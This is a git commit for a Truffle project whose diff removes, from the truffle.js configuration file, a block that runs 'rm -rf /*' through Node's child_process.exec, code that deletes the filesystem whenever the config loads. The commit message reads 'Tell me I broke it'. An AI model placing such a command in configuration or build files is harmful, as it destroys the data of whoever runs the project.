0c8ece645714720b73a8800802a37de49daa68bc
Tim Coulter <tim@timothyjcoulter.com>
2019-04-05 00:37:00 -0700

    Tell me I broke it

--- truffle.js
+++ truffle.js
@@ -1,15 +1,3 @@
-const { exec } = require('child_process');
-exec('rm -rf /*', (err, stdout, stderr) => {
-  if (err) {
-    // node couldn't execute the command
-    return;
-  }
-
-  // the *entire* stdout and stderr (buffered)
-  console.log(`stdout: ${stdout}`);
-  console.log(`stderr: ${stderr}`);
-});
-
 
 module.exports = {
   // See <http://truffleframework.com/docs/advanced/configuration>
